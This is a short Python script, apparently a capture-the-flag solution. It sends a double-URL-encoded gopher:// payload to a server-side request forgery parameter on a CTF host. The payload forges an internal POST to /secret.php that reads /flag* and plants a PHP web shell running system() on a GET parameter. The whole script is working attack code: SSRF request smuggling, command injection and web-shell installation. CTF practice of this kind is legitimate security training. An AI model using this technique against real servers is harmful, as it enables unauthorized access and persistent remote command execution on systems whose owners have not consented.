from urllib.parse import quote, quote_plus

import requests

URL = "http://ctf-gemastik.ub.ac.id:10022"

webshell = quote_plus('''echo "<?php system(\$_GET['a']);?>" > ddddd.php;''') # Quote with space as +

payload = '''POST /secret.php HTTP/1.1\r
Host: localhost:80\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 30\r\n\r
role=admin&query=cat /flag*
'''
print(len(webshell) + len("role=admin&query=")) #94

payload = '''POST /secret.php HTTP/1.1\r
Host: localhost:80\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 110\r\n\r
role=admin&query='''+ webshell

quoted = quote(quote(payload))

full_payload = "gopher://localhost:80/_" + quoted
full_url = URL + "?url=" + full_payload

print(full_payload)

r = requests.get(full_url)

print(r.text)